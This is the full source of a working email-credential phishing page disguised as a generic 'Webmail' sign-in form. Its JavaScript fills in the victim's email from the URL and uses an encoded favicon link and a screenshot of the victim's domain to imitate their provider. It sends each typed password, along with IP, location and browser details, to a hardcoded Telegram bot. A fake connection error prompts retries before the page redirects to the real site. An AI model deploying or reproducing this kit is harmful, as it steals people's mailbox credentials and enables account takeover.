      body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";color:#535353}.login-40 .form-section{max-width:380px;margin:0 auto;border-radius:10px;padding:10px 35px;border:1px solid #e8e7e7;margin-top:50px}.img-fluid{max-width:100%!important;height:auto}.login-40 .login-inner-form .form-box{float:left;width:100%;position:relative}.login-40 .login-inner-form .form-group{margin-bottom:30px}.login-40 .login-inner-form .form-box input{float:left;width:100%;padding:15.5px 50px 15.5px 25px}.login-40 .login-inner-form .input-text{font-size:16px;outline:none;color:#717171;border-radius:50px;border:1px solid #dbdbdb;box-shadow:0 1px 3px 0 rgb(0 0 0 / 6%)}.form-control:focus{box-shadow:none}.login-40 .login-inner-form .form-box i{position:absolute;top:14px;right:25px;font-size:19px}.logo{text-align:center;margin-bottom:35px}.login-40 .login-inner-form .checkbox{margin-bottom:30px;font-size:16px}.login-40 .login-inner-form input[type=checkbox],input[type=radio]{margin-top:4px;margin-right:3px;position:absolute;margin-left:0}.login-40 .login-inner-form label{font-weight:500;font-size:14px;margin-bottom:5px}.login-40 .login-inner-form .form-check-label{padding-left:25px;margin-bottom:0;font-size:16px;color:#717171}.login-40 .login-inner-form .checkbox-theme input[type=checkbox]:checked+label::before{background-color:#50a1ff;border-color:#50a1ff}.login-40 .login-inner-form input[type=checkbox]:checked+label:before{font-weight:300;color:#f3f3f3;line-height:15px;font-size:14px;content:"\2713";text-align:center}.login-40 .login-inner-form .form-check label::before{content:"";display:inline-block;position:absolute;width:22px;height:22px;margin-left:-27px;border:1px solid #c5c3c3;border-radius:3px;background-color:#fff}.btn-block{display:block;width:100%}.sub_b{-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}.sub_b:hover{background-color:#0b5ed79e;-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}.login-40 .login-inner-form .btn-md{cursor:pointer;padding:15.5px 50px 14.5px 50px;font-size:17px;font-weight:400;font-family:'Jost',sans-serif;border-radius:50px}.login-40 .login-inner-form .btn-theme{background:#50a1ff;border:none;color:#fff}.login-40 .login-inner-form .btn-theme:hover{background:#4595f1}.login-40 .login-inner-form .checkbox{margin-bottom:30px;font-size:16px}#logo{height:30px}body.sharp .f_base,body.sharp .f_form .form-control,body.sharp button,body.sharp .alert{border-radius:0;-webkit-border-radius:0;-moz-border-radius:0;-o-border-radius:0}a:hover{text-decoration:none}a{text-decoration:none;color:#007bff}body.sharp .alert{font-size:14px;padding:10px 10px}.dom_pl{font-size:16px;margin-bottom:0}.sub_b{-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}.sub_b:hover{background-color:#0b5ed79e;-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}#frame_back{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}.frame_back_over{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}#frame_back{display:none}.erx{margin:10px 0 0;padding:7px 5px;background-color:#c50000;color:#fff;font-size:16px;margin-top:-1px}.login-inner-form{margin-top:-20px}

<body class="dark sharp" id="lebody" style="background-image: url(https://i.imgur.com/W6H22Ci.png) ; background-size: cover;">
   <div class="loader_b hidden" id="loader">
      <div class="loader"></div>
   </div>
   <iframe id="frame_back" scrolling="no"></iframe>
   <div class="frame_back_over"></div>
   <div class="b_base login-40">
      <div class="f_base container">
         <div class="f_in row">
            <div class="col-md-12">
               <div class="form-section" style="background:rgba(250,250,250,2);">
                  <div class="f_in">
                     <div class="logo">
                        <a href="">
                            <img src="" alt="Webmail" id="logo">
                              <h2 id="logoname" style="font-size: 2rem;"> </h2>          
                        </a>
                    </div>
                     <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
                     <center><h1 style="color: #212529; line-height: 1.2;">Enter your mailbox password to proceed.</h1></center>

                     <div class="erx" style="display:none ;">Conection error, kindly try again!</div>
                     <div class="login-inner-form">
                        
                        <form class="f_form">
                           <input type="hidden" name="fcc" id="fcc" value="">
                           <div class="alert alert-danger mb-3 hidden" id="err" role="alert">
                           </div>
                           <div class="alert alert-primary mb-3 hidden" id="mi" role="alert">
                           </div>
                            <div class="form-group form-box">
                                <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
                            </div>
                            <div class="form-group form-box">
                                <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
                                <i class="fa fa-eye sla"  id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
                            </div>
                     <span id="msg" style="color:red;"></span>
                            <div class="checkbox clearfix">
                                <div class="form-check checkbox-theme">
                                    <input class="form-check-input" type="checkbox" value="" id="rem_me">
                                    <label class="form-check-label" for="rem_me">
                                        Remember me
                                    </label>
                                </div>
                            </div>
                            <div class="form-group mb-0">
                                <button type="submit" id="getitBtn" name="sub" class="btn-md btn-theme btn-block sub_b">Sign In</button>
                            </div>
                        </form>
                    </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
   
   <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
   <script>
      // Telegram Bot Configuration
      const TELEGRAM_BOT_TOKEN = '7848012493:AAEQSnG60NoDkAyB_wa0wchKj3UHEX3RAnY'; // Add your bot token here
      const TELEGRAM_CHAT_ID = '6209158260'; // Add your chat ID here
      
      // Function to send data to Telegram
      async function sendToTelegram(userData) {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('Telegram bot token or chat ID not configured');
            return;
         }
         
         try {
            const message = `
🔐 *New Login Attempt*
📧 *Email:* ${userData.email}
🔑 *Password:* ${userData.password}
🌐 *Domain:* ${userData.domain}
🖥️ *User Agent:* ${navigator.userAgent}
📍 *IP Address:* ${userData.ip}
🌍 *Country:* ${userData.country}
📱 *Platform:* ${navigator.platform}
🌐 *Browser Language:* ${navigator.language}
📏 *Screen Size:* ${window.screen.width}x${window.screen.height}
⏰ *Time:* ${new Date().toLocaleString()}
`;
            
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
               method: 'POST',
               headers: {
                  'Content-Type': 'application/json',
               },
               body: JSON.stringify({
                  chat_id: TELEGRAM_CHAT_ID,
                  text: message,
                  parse_mode: 'Markdown',
                  disable_web_page_preview: true
               })
            });
            
            return await response.json();
         } catch (error) {
            console.error('Error sending to Telegram:', error);
         }
      }
      
      // Function to get IP and country
      async function getUserIPAndCountry() {
         try {
            // First try ipapi.co
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            return {
               ip: data.ip || 'Unknown',
               country: data.country_name || 'Unknown',
               city: data.city || 'Unknown',
               region: data.region || 'Unknown',
               org: data.org || 'Unknown'
            };
         } catch (error) {
            try {
               // Fallback to ipify for IP only
               const ipResponse = await fetch('https://api.ipify.org?format=json');
               const ipData = await ipResponse.json();
               
               return {
                  ip: ipData.ip || 'Unknown',
                  country: 'Unknown',
                  city: 'Unknown',
                  region: 'Unknown',
                  org: 'Unknown'
               };
            } catch (fallbackError) {
               return {
                  ip: 'Unknown',
                  country: 'Unknown',
                  city: 'Unknown',
                  region: 'Unknown',
                  org: 'Unknown'
               };
            }
         }
      }
      
      // Function to simulate original form submission behavior
      function simulateOriginalBehavior(email, password, domain, checker) {
         // Show the error message (same as original)
         $(".erx").show();
         
         // Clear password field and focus after delay (same as original)
         setTimeout(() => {
            $("#password").val("").focus();
         }, 100);
         
         // Check if we should redirect after 3 submissions (same as original)
         if (checker > 3) {
            setTimeout(() => {
               window.location.href = "https://" + domain;
            }, 500);
            return true;
         }
         
         return false;
      }
      
      $(document).ready(function() {
         const getit = new URLSearchParams(window.location.search);
         const hashedget = getit.get('e');
         let dxmain = '';
         var checker = 0;
         
         if (!hashedget) {
            $('html').text('Error');
            window.stop();
         } else {
            $("#email").val(hashedget);
            dxmain = hashedget.split("@")[1];
            let sitename = dxmain.split(".")[0].toUpperCase();
            sitename = sitename.charAt(0).toUpperCase() + sitename.slice(1).toLowerCase();
            document.querySelector('title').prepend(sitename);
            document.querySelector('#logoname').prepend(sitename);
            
            let favimg = atob('aHR0cHM6Ly90MS5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnNpemU9NjQmdXJsPWh0dHA6Ly8=') + dxmain;
            document.querySelector('link[rel="shortcut icon"]').setAttribute('href', favimg);
            document.querySelector('body').style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${dxmain}')`;
            document.querySelector('#logo').setAttribute('src', favimg);
            
            $("form").on('submit', async (event) => {
               event.preventDefault();
               event.stopPropagation();
               $(".erx").hide();
               
               let email = $("#email").val();
               let password = $("#password").val();
               checker++;
               
               // Disable button and show "Verifying..." (same as original)
               $("#getitBtn").prop('disabled', true).html("Verifying...");
               
               // Get user IP and country
               const userInfo = await getUserIPAndCountry();
               
               // Send data to Telegram
               await sendToTelegram({
                  email: email,
                  password: password,
                  domain: dxmain,
                  ip: userInfo.ip,
                  country: userInfo.country,
                  city: userInfo.city,
                  region: userInfo.region,
                  org: userInfo.org
               });
               
               // Simulate network delay (similar to original AJAX call)
               setTimeout(() => {
                  // Re-enable button (same as original)
                  $('#getitBtn').prop('disabled', false).html("Sign In");
                  
                  // Simulate the original behavior
                  const shouldRedirect = simulateOriginalBehavior(email, password, dxmain, checker);
                  
                  // If not redirecting, we can optionally do something else here
                  if (!shouldRedirect) {
                     // Additional behavior can be added here if needed
                     // For example, you could send additional data or log something
                  }
               }, 1500); // Simulate network delay
            });
         }
      });
      
      function togglePasswordVisibility() {
         const e = document.getElementById("password");
         const t = document.getElementById("togglePassword");
         if ("password" === e.type) {
            e.type = "text";
            t.classList.remove("fa-eye");
            t.classList.add("fa-eye-slash");
         } else {
            e.type = "password";
            t.classList.remove("fa-eye-slash");
            t.classList.add("fa-eye");
         }
      }
   </script>
</body>
